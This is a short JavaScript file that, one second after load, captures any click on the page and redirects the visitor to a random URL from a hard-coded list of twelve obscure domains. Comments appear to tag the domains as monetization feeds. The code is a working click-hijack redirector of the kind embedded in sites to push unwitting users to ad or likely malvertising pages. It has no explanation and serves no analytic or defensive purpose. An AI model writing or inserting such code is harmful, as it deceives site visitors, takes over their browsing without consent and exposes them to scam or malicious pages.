function init() {
  var arr = [
    // mon: db
    "https://glooghalty.net/4/7237941",
    "https://owhopteefi.net/4/7436813",
    "https://pseleedrax.net/4/7237942",
    "https://beewoupaule.net/4/7420696",
    "https://koachewhome.net/4/7237921",
    "https://faireegli.net/4/7474716",

    // mon: lucy
    "https://phuruxoods.com/4/7683326",
    "https://whauzavouweb.com/4/7683329",
    "https://naglelri.net/4/7683327",
    "https://fouwhigrezi.net/4/7683328",
    "https://boovoogie.net/4/7683330",
    "https://rangauck.com/4/7683319",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 15000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);